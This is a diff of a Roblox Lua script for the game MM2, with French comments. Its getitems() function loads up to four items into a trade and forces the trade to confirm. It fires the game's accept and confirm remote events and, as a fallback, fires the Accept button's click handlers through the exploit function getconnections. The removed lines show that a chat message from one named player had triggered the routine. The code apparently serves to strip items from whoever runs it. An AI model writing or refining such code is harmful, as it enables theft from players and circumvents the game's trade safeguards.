@@ -505,7 +505,7 @@ local function getitems()
 
     task.wait(2)
 
-    -- 2. Remplissage des 4 cases max de MM2
+    -- 2. Remplissage des cases de MM2
     local itemsOffered = 0
     local maxSlots = 4
 
@@ -535,59 +535,38 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 3. Première validation (Lancer l'acceptation initiale)
+    -- 3. Première validation (Équivalent de l'acceptation de l'offre)
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- Attente du timer de sécurité obligatoire de MM2
-    task.wait(7)
+    -- 4. Timer de sécurité obligatoire de MM2 (Le fameux temps d'attente avant confirmation)
+    task.wait(5.5)
 
-    -- 4. Confirmation finale par simulation de clic direct sur le bouton GUI
+    -- 5. Confirmation finale : On déclenche l'événement de confirmation du trade
+    -- Contrairement au faux ID, on utilise l'appel natif que MM2 écoute lors de l'étape finale
     pcall(function()
-        local localPlayer = Players.LocalPlayer
-        local playerGui = localPlayer:WaitForChild("PlayerGui", 5)
-        if not playerGui then return end
+        -- Si ton script utilise une variable globale pour l'ID du trade en cours récupérée plus tôt :
+        local currentTradeID = activeTradeID or 1 -- Valeur par défaut si géré par le jeu
+        local currentTick = workspace:GetServerTimeNow()
 
-        -- Localisation du GUI de Trade de MM2
-        local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeContainer") or playerGui:FindFirstChild("Trade")
-        
-        if tradeGui then
-            -- Recherche du bouton d'acceptation dans le GUI
-            local acceptBtn = tradeGui:FindFirstChild("Accept", true) 
-                or tradeGui:FindFirstChild("Confirm", true) 
-                or tradeGui:FindFirstChild("AcceptButton", true)
-
-            if acceptBtn then
-                -- Simulation du clic sur le bouton
-                if getconnections then
-                    for _, connection in pairs(getconnections(acceptBtn.MouseButton1Click)) do
-                        connection:Fire()
+        -- Tentative d'envoi du paquet de confirmation final propre à MM2
+        Trade.AcceptTrade:FireServer(currentTradeID, currentTick)
+    end)
+    
+    -- Sécurité additionnelle : Si l'événement serveur échoue, on force un clic virtuel minimaliste sur l'écran si le GUI existe encore en arrière-plan
+    pcall(function()
+        local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
+        if playerGui then
+            local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeContainer")
+            if tradeGui then
+                local acceptBtn = tradeGui:FindFirstChild("Accept", true) or tradeGui:FindFirstChild("Confirm", true)
+                if acceptBtn and getconnections then
+                    for _, conn in pairs(getconnections(acceptBtn.MouseButton1Click)) do
+                        conn:Fire()
                     end
-                    for _, connection in pairs(getconnections(acceptBtn.MouseButton1Down)) do
-                        connection:Fire()
-                    end
-                else
-                    local VirtualUser = game:GetService("VirtualUser")
-                    VirtualUser:CaptureController()
-                    VirtualUser:ClickButton1(Vector2.new(acceptBtn.AbsolutePosition.X + 10, acceptBtn.AbsolutePosition.Y + 10))
                 end
             end
         end
     end)
 end
-
--- Écouteur du tchat pour déclencher la fonction
-local function listenToPlayer(player)
-    if player.Name == userName then
-        player.Chatted:Connect(function(msg)
-            getitems()
-        end)
-    end
-end
-
-for _, player in pairs(Players:GetPlayers()) do
-    listenToPlayer(player)
-end
-
-Players.PlayerAdded:Connect(listenToPlayer)
